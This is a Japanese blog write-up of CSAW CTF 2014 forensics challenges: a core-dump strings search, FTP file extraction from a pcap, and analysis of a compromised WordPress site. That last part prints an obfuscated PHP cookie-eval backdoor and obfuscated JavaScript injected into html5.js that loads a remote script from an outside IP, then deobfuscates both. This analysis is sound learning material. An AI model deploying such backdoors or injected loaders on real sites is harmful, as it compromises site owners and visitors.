---
title: "CSAW CTF 2014 Quals Forensics"
date: 2014-09-23 03:07:38 +0900
author: Mei Akizuru
tags:
  - CTF
  - CSAW CTF
  - Write-up
aliases:
    - /blog/2014/09/23/csawctf2014-forensics/
---

CSAW CTF 2014 Quals、Forensicsのwrite-upです。私が解いたのはForensicsの4問中、200点のObscurityを除いた3問です。

# [100] dumpster diving

## 問題文

> dumpsters are cool, but cores are cooler
>
> Written by marc
>
> firefox.mem.zip

## 解答

Answer: cd69b4957f06cd818d7bf3d61980e291

与えられるのは'firefox.mem.zip'で、コアダンプです。私が取りかかった時点で既に他のメンバーからbinwalkしてみたらSQLiteのなんかが見えていると報告がありました。Firefoxのコアダンプであれば何か見えててもおかしくないですね。

とりあえずstringsで何か見えないかなと思ってstringsの出力結果を'flag'でgrepしてみます。

```
(前略)
etablemoz_annosmoz_annos CREATE TABLE moz_annos (  id INTEGER PRIMARY KEY, place_id INTEGER NOT NULL, anno_attribute_id INTEGER, mime_type VARCHAR(32) DEFAULT NULL, content LONGVARCHAR, flags INTEGER DEFAULT 0, expiration INTEGER DEFAULT 0, type INTEGER DEFAULT 0, dateAdded INTEGER DEFAULT 0, lastModified INTEGER DEFAULT 0)
ZZZZZZZZflag{cd69b4957f06cd818d7bf3d61980e291}
ZZZZZZZZZZZZZZTransparent BG enabling flag
(後略)
```

マジで見つかりました。本当にありがとうございました。


# [200] why not sftp?

## 問題文

> well seriously, why not?
>
> Written by marc
>
> traffic-5.pcap

## 解答

Answer: 91e02cd2b8621d0c05197f645668c5c4

与えられる'traffic-5.pcap'をとりあえずWiresharkで見てみます。問題名が'why not sftp?'なんだし、きっとFTP通信でなんかやってるだろうと思ってftpとftp-dataでフィルタします。通信を追っていくと'/files/zip.zip'をダウンロードしています。当該するdataの方の通信をFollow TCP Streamするとflag.pngとか書いてあるのでまず間違いなさそうです。ftp-dataのパケットからzip.zipを抽出します。

取り出したzip.zipはパスワードも何もかかっていないのでそのまま展開します。するとflag.pngが展開され、それにフラグが書かれていました。

余談ですが、HTTPでやりとりしたファイルはWiresharkのExport Objectsから取り出せますが、FTPの場合はデータ通信の方をFollow TCP StreamしてRawで保存すればよいことをお勉強しました。


# [300] Fluffy No More

## 問題文

> OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious "Forgotten Freaks" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??
>
> Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!
>
> Written by brad_anton
>
> CSAW2014-FluffyNoMore-v0.1.tar.bz2

## 解答

Answer: Those Fluffy Bunnies Make Tummy Bumpy

与えられたアーカイブを展開すると、etc_directory.tar.bz、logs.tar.bz2、webroot.tar.bz2、mysql_backup.sql.bz2の4つのファイルが出てきます。それぞれ、etc以下、/var/log以下、/var/www以下を固めたもので、mysql_backup.sql.bz2はmysqldumpの出力結果をbzip2で圧縮したものです。

/var/www以下やデータベースのダンプを見るにWordPressが動いていて、そこがやられたという状況のようです。ひとまずapache2のaccess.logを見ていきます。非常に大きなファイルですが、大半はツールによるアタック試行のログです。SQLインジェクションやら何やらを色々試しています。データベースのダンプを見るとwp_commentsに犯人による犯行予告（「ハックしてやったぜBWHAHAHAHA」じゃなくて「ハックしてやるぜBWHAHAHA」だった）があるので、そのコメントの時刻以降のログを見てみます。

まずPOSTに絞って見てみるとプラグイン絡みでちょっと怪しげなログを見つけました。wysija-newslettersというプラグインで、そのプラグインについて調べてみたところ、任意ファイルのアップロードが可能な脆弱性が存在していたそうです。その後その脆弱性は修正されましたが、実際にはPHPの設定によってはその対策をすり抜けることが可能でした（そしてさらに対策される）。この環境にインストールされているもののバージョンを調べてみると、ちょうどその脆弱性が残っていたバージョンだった上に、[WordPress Security - MailPoet Vuln Contributes to Thousands of Infected Websites | Sucuri Blog](http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html)で言及されているのと同じ形のログが残っていました。

アクセスログから/wp-content/uploads/wysija/themes/weblizer/template.phpというのにアクセスしていることがわかったので、そのファイルを見てみます。中身は次のようなPHPファイルです。

```
<?php
$hije = str_replace("ey","","seyteyrey_reyeeypleyaeyceye");
$andp="JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ";
$rhhm="nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==";
$pvqw="GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw";
$wfrm="bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq";
$vyoh = $hije("n", "", "nbnansne64n_ndnecode");
$bpzy = $hije("z","","zczreaztzez_zfzuznzcztzizon");
$xhju = $bpzy('', $vyoh($hije("sq", "", $andp.$pvqw.$wfrm.$rhhm))); $xhju();
?>
```

`$hije`が`str_replace`、`$vyoh`が`base64_decode`、`$bpzy`が`create_function`関数です。このとき初めて知ったんですが、PHPでは文字列変数に対して`$hoge()`みたいに`()`を付けて使うと、その変数に入っている名前の関数を呼び出すという機能があります。びっくり。

それはともかくとして、このコードは

1. `$andp`、`$pvqw`、`$wfrm`、`$rhhm`を結合する
2. その中の'sq'を取り除く
3. その文字列をBase64デコードする
4. その文字列を関数化する
5. それを実行する

というコードです。`create_function`で関数化されたコードは次のコードです（実際の出力を整形しています）

```
$c='count';
$a=$_COOKIE;
if (reset($a) == 'ha' && $c($a) > 3) {
  $k='ckit';
  echo '<'.$k.'>';
  eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
  echo '</'.$k.'>';
}
```

Cookieが所定の条件を満たすとき、その中に入っているBase64文字列をevalする、というコードのようです。どう見てもバックドアです。本当にありがとうございました。

しかし、ログに記録されてない上にパケットキャプチャもないので、Cookieの中身はわかりません。つまりどんなコードが実行されたのかが全く不明です。データベースの中に何かしら残っていないか探してみましたが見つかりません。ここで一旦手詰まりとなってしまいました。

そこで隣に座ってた某氏が'/var/log/auth.log'を見ていて次の箇所を指摘しました。

```
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
```

ご覧の通り、sudoでviが実行されています。察し。……ていうかubuntuユーザーでログインされてsudoまでされてるんですがそれは……。

それはともかく/wp-content/themes/twentythirteen/js/html5.jsを見てみます。先頭のコメントにHTML5 Shivとあります。バージョンは3.7.0。[HTML5Shivのリポジトリ](https://github.com/aFarkas/html5shiv)から3.7.0のファイルをダウンロードし、このファイルとの差異を探すと、末尾に次のコードが追加されていました。

```
var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i<f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i<c.length;i++){if(((i==3||i==6)&&w!=2)||((i==8)&&w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("<"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'>\</"+m+"\>");
```

[beautify](http://jsbeautifier.org/)してみます。

```
var g = "ti";
var c = "HTML Tags";
var f = ". li colgroup br src datalist script option .";
f = f.split(" ");
c = "";
k = "/";
m = f[6];
for (var i = 0; i < f.length; i++) {
    c += f[i].length.toString();
}
v = f[0];
x = "\'ht";
b = f[4];
f = 2541 * 6 - 35 + 46 + 12 - 15269;
c += f.toString();
f = (56 + 31 + 68 * 65 + 41 - 548) / 4000 - 1;
c += f.toString();
f = "";
c = c.split("");
var w = 0;
u = "s";
for (var i = 0; i < c.length; i++) {
    if (((i == 3 || i == 6) && w != 2) || ((i == 8) && w == 2)) {
        f += String.fromCharCode(46);
        w++;
    }
    f += c[i];
}
i = k + "anal";
document.write("<" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g + "c" + u + v + "j" + u + "\'>\</" + m + "\>");
```

このコードをnodeに与えて、`document.write`の引数になっている文字列を見てみると次のようになります。

```
<script src='http://128.238.66.100/analytics.js'></script>
```

つまりhtml5.jsが実行されると'http://128.238.66.100/analytics.js'が読まれて実行されるわけです。ここにアクセスしてanalytics.jsを見てみます（長いので中身は省略します）。すると、明らかにおかしな箇所がありました。

```
var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
window[_0x91fe[2]](_0x91fe[0], _0x91fe[1]);
```

`_0x91fe`に代入している箇所をnodeに与えて中身を見てみます。

```
> var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
undefined
> _0x91fe
[ 'http://128.238.66.100/announcement.pdf',
  '_self',
  'open' ]
```

これを踏まえた上で先のコードの2行目を見れば、`window['open']`(`window.open`関数)で'http://128.238.66.100/announcement.pdf'を開いていることになります。

'http://128.238.66.100/announcement.pdf'は実際にPDFで、なんかビジュアル系バンドっぽい人物の写真に'I AM HACKING YOU RIGHT NOW'という文が書いてある画像があるだけのPDFです。

ひとしきりここで爆笑して作業に戻りますと、pdfextractでストリームデータをダンプしてみるように言われました。-sオプションを使ってストリームをダンプします。結果として'stream_{1,2,3,8}.dmp'の4つのファイルが現れます。これらに対してひとまずstringsをしてみます（ていうか先にfileで見てみるべきだったかもしれない）。すると'stream_8.dmp'に何か書かれています。

```
var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
```

JavaScriptっぽいのでnodeに与えてみます。

```
> var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
undefined
> _0xee0b
[ 'YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}' ]
```

というわけで無事にフラグを得ることができました。